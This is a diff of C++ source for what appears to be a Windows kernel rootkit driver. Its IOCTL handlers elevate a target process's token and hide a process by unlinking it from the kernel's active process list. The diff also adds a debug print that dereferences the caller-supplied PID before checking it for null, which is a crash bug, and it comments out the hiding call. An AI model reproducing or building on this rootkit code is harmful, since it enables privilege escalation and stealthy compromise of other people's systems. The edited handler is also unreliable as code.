@@ -1,5 +1,5 @@
 #include "IoctlHandlers.h"
-#include "ProcessHandler.h"
+#include "ProcHandler.h"
 #include "TokenHandler.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
@@ -8,13 +8,17 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	auto pid = (PULONG)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+
+	DbgPrint("Token Elevator: Received pid %lu", *pid);
+
 	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
 
 	status = PsLookupProcessByProcessId(UlongToHandle(*pid), &Process);
+
 	if (!NT_SUCCESS(status)) {
 		Irp->IoStatus.Information = 0;
 		return status;
@@ -39,7 +43,9 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
-	status = ProcessHandler::UnlinkActiveProcessLinks(*pid);
+
+	//status = ProcHandler::UnlinkActiveProcessLinks(*pid);
+	//status = SayHi::SayHi(6);
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
 	return status;
